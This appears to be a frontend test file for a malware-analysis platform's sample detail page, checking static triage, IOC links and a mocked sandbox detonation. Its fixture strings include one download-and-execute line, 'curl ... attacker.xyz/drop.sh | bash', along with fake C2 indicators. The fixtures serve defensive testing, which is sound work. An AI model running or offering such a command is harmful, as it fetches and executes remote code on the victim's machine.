import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { fireEvent, render, screen, waitFor } from "@testing-library/react";
import { MemoryRouter, Route, Routes } from "react-router-dom";
import { describe, expect, it, vi } from "vitest";
import SampleDetailPage from "../routes/sampleDetail";
import type { SampleDetonationResult, SampleRow, SampleStatic } from "../types";

const { mockSample, mockStatic, detonateSampleMock } = vi.hoisted(() => {
  const sample: SampleRow = {
    sample_id: "s_malware_demo",
    sha256: "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
    original_name: "trojan_payload.elf",
    size: 34560,
    detected_platform: "linux",
    created_at: "2026-08-20T12:00:00Z",
    synthetic: false,
    yara_rules: ["elf_suspicious_imports", "dropper_heuristic"],
    vt_detections: 4,
    malware_family: "AgentTesla",
    family: "trojan",
    runs_count: 1,
  };

  const st: SampleStatic = {
    sample_id: "s_malware_demo",
    sha256: "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
    available: true,
    size: 34560,
    pe: null,
    elf: null,
    strings: ["/bin/sh", "curl -s http://attacker.xyz/drop.sh | bash", "198.51.100.44", "trojan.c2.io"],
    iocs: {
      urls: ["http://attacker.xyz/drop.sh"],
      ips: ["198.51.100.44"],
      domains: ["attacker.xyz", "trojan.c2.io"],
      hashes: ["5d41402abc4b2a76b9719d911017c592"],
      emails: ["c2operator@darknet.org"],
    },
    entropy: 7.42,
    is_packed: true,
    entropy_histogram: [5.2, 6.1, 7.8, 7.9, 7.2, 6.5],
    static_risk_score: 85,
    static_severity: "malicious",
    risk_factors: ["UPX packed binary structure", "Hardcoded plain HTTP C2 endpoints", "Process injection APIs found"],
    capabilities: [
      { category: "Execution", confidence: "high", matched: ["execve", "system"] },
      { category: "Command & Control", confidence: "high", matched: ["connect", "socket"] },
    ],
  };

  const detonation: SampleDetonationResult = {
    run_id: "dyn_run_test999",
    sample_id: "s_malware_demo",
    sample_name: "trojan_payload.elf",
    platform: "linux",
    exit_code: 0,
    isolation_driver: "bubblewrap",
    terminal_output: "$ bwrap --ro-bind-try / /tmp/sandbox\n[OutPost Dynamic Sandbox Cage Active · Process PID Isolated]\n[OutPost Artifact Extractor] Captured 1 dropped file(s).\nExecution completed with exit code: 0",
    terminal_lines: [
      "$ bwrap --ro-bind-try / /tmp/sandbox",
      "[OutPost Dynamic Sandbox Cage Active · Process PID Isolated]",
      "[OutPost Artifact Extractor] Captured 1 dropped file(s).",
      "Execution completed with exit code: 0",
    ],
    events: [
      { event_type: "process_create", pid: 1042, command_line: "./trojan_payload.elf" },
      { event_type: "file_write", pid: 1042, file_path: "/tmp/stealer_output.txt" },
      { event_type: "network_connection", pid: 1042, dest_ip: "198.51.100.44", dest_port: 4444 },
    ],
    events_count: 3,
    alerts: [
      {
        id: 1,
        rule_id: "outbound_c2_beacon",
        rule_name: "Suspicious Outbound C2 Beacon",
        severity: "malicious",
        details: "Process connected to known adversary IP 198.51.100.44:4444",
        run_id: "dyn_run_test999",
      },
    ],
    alerts_count: 1,
    risk_score: 92,
    process_tree: [
      {
        pid: 1042,
        name: "trojan_payload.elf",
        cmdline: "./trojan_payload.elf",
        children: [],
      },
    ],
    dropped_artifacts: [
      {
        artifact_id: "art_123",
        filename: "stealer_output.txt",
        name: "stealer_output.txt",
        size_bytes: 1420,
        entropy: 7.82,
        is_high_entropy: true,
        sha256: "b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3",
        md5: "098f6bcd4621d373cade4e832627b4f6",
        download_url: "/sandbox/artifacts/dyn_run_test999/stealer_output.txt",
        preview: ["credential_dump_token=xyz123", "target_host=finance-ws01"],
      },
    ],
    sinkhole_traffic: [
      {
        type: "tcp_socket",
        target: "198.51.100.44:4444",
        intercepted_response: "SYN-ACK (OUTPOST_SINKHOLE_ACTIVE)",
        action: "sinkholed",
      },
    ],
    timeline: [
      {
        timestamp: "2026-08-20T12:00:00.120Z",
        elapsed_ms: 120,
        category: "process",
        title: "Binary Process Initialized",
        details: "PID 1042 spawned under Bubblewrap micro-sandbox",
        severity: "info",
      },
      {
        timestamp: "2026-08-20T12:00:00.450Z",
        elapsed_ms: 450,
        category: "network",
        title: "Egress Connection Attempted",
        details: "TCP connect to 198.51.100.44:4444 intercepted by sinkhole",
        severity: "malicious",
      },
    ],
  };

  const detonateMock = vi.fn().mockResolvedValue(detonation);

  return {
    mockSample: sample,
    mockStatic: st,
    detonateSampleMock: detonateMock,
  };
});

vi.mock("../lib/api", async (importOriginal) => {
  const actual = await importOriginal<typeof import("../lib/api")>();
  return {
    ...actual,
    getSample: vi.fn().mockImplementation(() => Promise.resolve(mockSample)),
    getSampleStatic: vi.fn().mockImplementation(() => Promise.resolve(mockStatic)),
    getRuns: vi.fn().mockImplementation(() => Promise.resolve([])),
    getSimilarSamples: vi.fn().mockImplementation(() => Promise.resolve({ sample_id: "s_malware_demo", similar: [] })),
    getSandboxProviders: vi.fn().mockImplementation(() => Promise.resolve({ providers: [] })),
    detonateSample: detonateSampleMock,
    getSandboxArtifactUrl: (runId: string, filename: string) => `/sandbox/artifacts/${runId}/${filename}`,
  };
});

function renderSampleDetail(sampleId = "s_malware_demo") {
  const queryClient = new QueryClient({
    defaultOptions: {
      queries: { retry: false },
    },
  });

  return render(
    <QueryClientProvider client={queryClient}>
      <MemoryRouter initialEntries={[`/samples/${sampleId}`]}>
        <Routes>
          <Route path="/samples/:sampleId" element={<SampleDetailPage />} />
        </Routes>
      </MemoryRouter>
    </QueryClientProvider>,
  );
}

describe("SampleDetailPage Dual-Mode Architecture", () => {
  it("renders sample header and VirusTotal pivot link for sample SHA-256", async () => {
    renderSampleDetail();

    await waitFor(() => {
      expect(screen.getAllByText("trojan_payload.elf").length).toBeGreaterThanOrEqual(1);
    });

    const vtLinks = screen.getAllByRole("link", { name: /VirusTotal/i });
    expect(vtLinks.length).toBeGreaterThanOrEqual(1);
    const hasHashPivot = vtLinks.some((a) =>
      a.getAttribute("href")?.includes(`https://www.virustotal.com/gui/file/${mockSample.sha256}`),
    );
    expect(hasHashPivot).toBe(true);
  });

  it("renders Mode 1: Safe Static Triage by default with zero execution guarantee", async () => {
    renderSampleDetail();

    await waitFor(() => {
      expect(screen.getByText(/Mode 1: Static Triage/i)).toBeInTheDocument();
      expect(screen.getByText(/Mode 2: Dynamic Sandbox/i)).toBeInTheDocument();
    });

    // Verify safe static status banner
    expect(screen.getByText(/Mode 1: Safe Static Triage \(Zero Execution Risk\)/i)).toBeInTheDocument();
    expect(screen.getByText(/Static Safe/i)).toBeInTheDocument();

    // Verify extracted IOCs and their VirusTotal external pivot links
    await waitFor(() => {
      expect(screen.getAllByText("attacker.xyz").length).toBeGreaterThanOrEqual(1);
      expect(screen.getAllByText("198.51.100.44").length).toBeGreaterThanOrEqual(1);
    });

    await waitFor(() => {
      const domainVtLink = screen.getByRole("link", {
        name: /VirusTotal external threat intelligence lookup for attacker\.xyz/i,
      });
      expect(domainVtLink).toHaveAttribute("href", "https://www.virustotal.com/gui/domain/attacker.xyz");

      const ipVtLink = screen.getByRole("link", {
        name: /VirusTotal external threat intelligence lookup for 198\.51\.100\.44/i,
      });
      expect(ipVtLink).toHaveAttribute("href", "https://www.virustotal.com/gui/ip-address/198.51.100.44");
    });
  });

  it("switches to Mode 2: Dynamic Sandbox Cockpit and renders dual-deck in standby", async () => {
    renderSampleDetail();

    await waitFor(() => {
      expect(screen.getByText(/Mode 2: Dynamic Sandbox/i)).toBeInTheDocument();
    });

    // Click to switch to Mode 2
    fireEvent.click(screen.getByText(/Mode 2: Dynamic Sandbox/i));

    // Check cockpit shell headers
    await waitFor(() => {
      expect(screen.getByText(/Mode 2: Dynamic Sandbox Cockpit/i)).toBeInTheDocument();
      expect(screen.getByText(/Isolated Flight Recorder/i)).toBeInTheDocument();
    });

    // Check left deck standby console
    expect(screen.getByText("Sandbox Terminal Standby")).toBeInTheDocument();
    expect(screen.getByText(/Binary has been safely triaged statically/i)).toBeInTheDocument();

    // Check right deck behavioral KPI meters in standby
    expect(screen.getByText("Files Created")).toBeInTheDocument();
    expect(screen.getByText("Processes")).toBeInTheDocument();
    expect(screen.getByText("Network Sockets")).toBeInTheDocument();
    expect(screen.getByText("Rule Hits")).toBeInTheDocument();
  });

  it("triggers live sandbox detonation, updating terminal and telemetry flight recorder", async () => {
    renderSampleDetail();

    await waitFor(() => {
      expect(screen.getByText(/Mode 2: Dynamic Sandbox/i)).toBeInTheDocument();
    });

    // Switch to Dynamic Sandbox
    fireEvent.click(screen.getByText(/Mode 2: Dynamic Sandbox/i));

    // Wait for the detonate button to appear in the DOM
    let detonateButton!: HTMLElement;
    await waitFor(() => {
      detonateButton = screen.getByRole("button", { name: /Detonate Live Now/i });
      expect(detonateButton).toBeInTheDocument();
    });

    // Click "Detonate Live Now"
    fireEvent.click(detonateButton);

    await waitFor(() => {
      expect(detonateSampleMock).toHaveBeenCalledWith("s_malware_demo", 15, "auto");
    });

    // Verify terminal output updated
    await waitFor(() => {
      expect(screen.getAllByText(/OutPost Dynamic Sandbox Cage Active/i).length).toBeGreaterThanOrEqual(1);
      expect(screen.getAllByText(/Captured 1 dropped file\(s\)/i).length).toBeGreaterThanOrEqual(1);
    });

    // Verify right deck flight recorder updated with auto-selected detection rules tab
    await waitFor(() => {
      expect(screen.getByText("Suspicious Outbound C2 Beacon")).toBeInTheDocument();
      expect(screen.getByRole("link", { name: /Escalate to Case/i })).toBeInTheDocument();
    });

    // Switch to Files tab to inspect dropped artifacts
    fireEvent.click(screen.getByRole("button", { name: /Files \(1\)/i }));

    await waitFor(() => {
      expect(screen.getByText("stealer_output.txt")).toBeInTheDocument();
      expect(screen.getByText(/High Entropy \(7\.82\/8\.0\)/i)).toBeInTheDocument();
    });

    // Verify download link is rendered for dropped artifact
    const downloadLink = screen.getByRole("link", { name: /Download/i });
    expect(downloadLink).toBeInTheDocument();
    expect(downloadLink.getAttribute("href")).toContain("/sandbox/artifacts/dyn_run_test999/stealer_output.txt");
  });
});
